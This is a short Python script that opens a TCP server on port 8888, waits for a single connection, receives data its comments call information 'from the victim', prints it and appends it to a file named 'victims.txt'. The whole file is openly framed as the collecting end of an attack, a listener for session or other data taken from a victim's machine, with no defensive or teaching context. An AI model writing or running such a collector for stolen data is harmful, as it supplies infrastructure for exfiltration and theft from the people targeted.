import socket

PORT = 8888  # Port to use for the server
FILE_SAVE = "victims.txt"  # filename to use to backup the session information

# Setup the connection
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("", PORT))
server.listen(5)

# Start and waiting for an external connection
print("Server start")
connection, address = server.accept()

# Download and decode information from the victim
print("New conection")
victim_data = connection.recv(4096)

# Print them
print(victim_data.decode("utf-8", errors="replace"))

# save them into a file
file = open(FILE_SAVE, "ab")
file.write(victim_data + b"\n")
file.close()

# Close connection
connection.close()
